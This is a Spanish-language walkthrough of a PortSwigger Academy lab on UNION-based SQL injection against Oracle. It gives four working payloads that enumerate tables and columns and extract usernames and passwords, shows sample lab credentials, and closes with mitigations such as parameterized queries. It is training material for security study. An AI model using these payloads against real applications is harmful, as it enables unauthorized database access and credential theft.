Lab06: SQL injection attack, listing the database contents on Oracle

Nivel Practitioner
Tipo de SQLi SQL Injection basado en UNION

Objetivo

Enumerar las tablas de la base de datos Oracle, identificar la tabla que contiene las credenciales de usuario, extraer los nombres de usuario y contraseñas, y finalmente iniciar sesión como usuario administrator.

Vulnerabilidad

El filtro de categoría de productos es vulnerable a inyecciones SQL. La aplicación no valida la entrada del usuario en el parámetro category, permitiendo realizar ataques UNION.

Particularidades de Oracle:

  • Cada consulta SELECT debe incluir la cláusula FROM. Para consultas sin tabla real, se utiliza la tabla dummy DUAL.
  • La información del esquema en Oracle se encuentra en vistas como all_tables y all_tab_columns.
  • Los nombres de tablas y columnas en Oracle suelen almacenarse en mayúsculas.

Procedimiento

  1. Iniciar Burp Suite y activar la interceptación en la pestaña Proxy. Seleccionar una categoría (por ejemplo, "Accessories") y enviar la petición al Repeater.
  2. Determinar el número de columnas y probar la sintaxis de Oracle con la tabla DUAL: 
    ' UNION SELECT 'abc','def' FROM DUAL--

    Al obtener respuesta, sabemos que existen dos columnas, que ambas aceptan texto y que la sintaxis con DUAL es correcta.

  3. Obtener los nombres de las tablas consultando all_tables: 
    ' UNION SELECT table_name, NULL FROM all_tables--

    En la respuesta se listan todas las tablas de la base de datos. Se busca una tabla con un nombre que parezca contener usuarios (ej. USERS_ABCDEF, USERS_TAAVZN, etc.).

  4. Obtener los nombres de las columnas de la tabla de usuarios: 
    ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--

    Se reemplaza 'USERS_ABCDEF' por el nombre real de la tabla encontrada (en mayúsculas). La respuesta mostrará columnas como USERNAME_ABCDEF, PASSWORD_XYZ, etc.

  5. Extraer las credenciales de la tabla de usuarios: 
    ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--

    En la respuesta aparecerán los nombres de usuario y contraseñas, incluyendo las del administrador.

  6. Iniciar sesión con las credenciales obtenidas del usuario administrator.

Payloads utilizados

Payload 1 (prueba de columnas con DUAL)

' UNION SELECT 'abc','def' FROM DUAL--

Payload 2 (enumeración de tablas)

' UNION SELECT table_name, NULL FROM all_tables--

Payload 3 (enumeración de columnas)

' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--

Payload 4 (extracción de credenciales)

' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--

Explicación de los payloads

  • Payload 1: ' UNION SELECT 'abc','def' FROM DUAL-- : En Oracle es obligatorio incluir FROM, por eso se usa la tabla dummy DUAL. Las cadenas 'abc' y 'def' confirman que ambas columnas aceptan texto.
  • Payload 2: ' UNION SELECT table_name, NULL FROM all_tables-- : Consulta la vista all_tables para obtener los nombres de todas las tablas a las que el usuario tiene acceso.
  • Payload 3: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'-- : Obtiene los nombres de las columnas de la tabla de usuarios específica. Los nombres de tabla en Oracle deben ir en mayúsculas.
  • Payload 4: ' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF-- : Extrae los datos de las columnas identificadas, mostrando las credenciales de todos los usuarios.

Nota importante sobre Oracle

En Oracle, los nombres de tabla y columna se almacenan en mayúsculas por defecto. Si la tabla se creó sin comillas dobles, debe consultarse en mayúsculas. Además, cada SELECT debe tener una cláusula FROM, y DUAL es la tabla dummy estándar de Oracle.

Verificación del ataque

Al enviar el payload de extracción de credenciales, la respuesta HTTP muestra las credenciales de los usuarios en formato legible, por ejemplo:

administrator: 8fg5h2j1
carlos: password123
peter: passw0rd

Con las credenciales del administrador, se accede al panel de administración, confirmando que la inyección SQL fue exitosa y que se ha comprometido la confidencialidad de la base de datos Oracle.

Resultado esperado: El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Mitigación recomendada

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los comandos SQL inyectados se tratan como simples datos y no como código ejecutable.

SELECT * FROM products WHERE category = ? AND released = 1

Principio de mínimo privilegio en Oracle

La cuenta de base de datos debe tener permisos estrictamente necesarios. No debería tener acceso a vistas como all_tables o all_tab_columns si no es imprescindible.

Validación de entrada

Permitir solo valores esperados para el parámetro de categoría (lista blanca).

Gestión segura de errores

No mostrar errores detallados de base de datos al usuario. Configurar mensajes genéricos y guardar detalles en logs internos.

Escapado de caracteres especiales

Como defensa adicional, escapar correctamente los caracteres como comillas simples.
